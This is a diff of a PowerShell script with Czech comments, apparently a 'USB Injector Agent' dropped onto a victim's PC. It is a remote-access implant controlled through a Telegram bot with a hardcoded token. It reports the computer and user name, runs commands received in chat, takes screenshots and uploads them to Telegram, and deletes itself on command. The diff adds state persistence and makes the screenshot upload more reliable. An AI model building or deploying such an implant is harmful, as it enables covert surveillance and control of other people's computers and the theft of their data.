@@ -1,6 +1,35 @@
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
-$lastUpdateId = 0
+$stateFile = "C:\agent_state.txt"
 $chatId = $null
+
+# Načti uložený stav (pokud existuje)
+if(Test-Path $stateFile) {
+    $savedState = Get-Content $stateFile -Raw | ConvertFrom-Json
+    $lastUpdateId = $savedState.lastUpdateId
+    $chatId = $savedState.chatId
+    Write-Host "Obnovuji stav: updateId=$lastUpdateId, chatId=$chatId"
+} else {
+    # Při prvním spuštění získej aktuální update_id a přeskoč staré zprávy
+    try {
+        $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates?timeout=1" -Method Get -TimeoutSec 5
+        if($response.result.Count -gt 0) {
+            $lastUpdateId = ($response.result | Select-Object -Last 1).update_id
+            Write-Host "Preskakuji staré zprávy, začínám od update_id=$lastUpdateId"
+        } else {
+            $lastUpdateId = 0
+        }
+    } catch {
+        $lastUpdateId = 0
+    }
+}
+
+function Save-State {
+    $state = @{
+        lastUpdateId = $lastUpdateId
+        chatId = $chatId
+    } | ConvertTo-Json
+    $state | Out-File -FilePath $stateFile -Force
+}
 
 function Send-Message($text) {
     if(!$chatId){return}
@@ -20,9 +49,11 @@ while($true) {
         
         foreach($update in $response.result) {
             $lastUpdateId = $update.update_id
+            Save-State  # Ulož stav po každé zprávě
             
             if(!$chatId -and $update.message.chat.id) {
                 $chatId = $update.message.chat.id
+                Save-State
                 Send-Message "[ONLINE] USB Injector Agent aktivni`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`n`nZadej prikaz nebo /help"
             }
             
@@ -41,6 +72,7 @@ while($true) {
             } elseif($cmd -eq '/kill') {
                 Send-Message "Agent se ukoncuje..."
                 Remove-Item "C:\agent.ps1" -Force -ErrorAction SilentlyContinue
+                Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                 exit
             } elseif($cmd -eq '/screenshot') {
                 Send-Message "Delam screenshot..."
@@ -61,22 +93,16 @@ while($true) {
                 
                 # Pošli screenshot do Telegramu
                 $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
-                $boundary = [System.Guid]::NewGuid().ToString()
-                $LF = "`r`n"
-                $bodyLines = (
-                    "--$boundary",
-                    "Content-Disposition: form-data; name=`"chat_id`"$LF",
-                    $chatId,
-                    "--$boundary",
-                    "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
-                    "Content-Type: image/png$LF",
-                    [System.IO.File]::ReadAllBytes($screenshot),
-                    "--$boundary--$LF"
-                ) -join $LF
+                $form = @{
+                    chat_id = $chatId
+                    photo = Get-Item -Path $screenshot
+                }
                 
                 try {
-                    Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
-                } catch {}
+                    Invoke-RestMethod -Uri $uri -Method Post -Form $form
+                } catch {
+                    Send-Message "[ERROR] Screenshot se nepodarilo odeslat"
+                }
                 
                 Remove-Item $screenshot -Force
             } else {
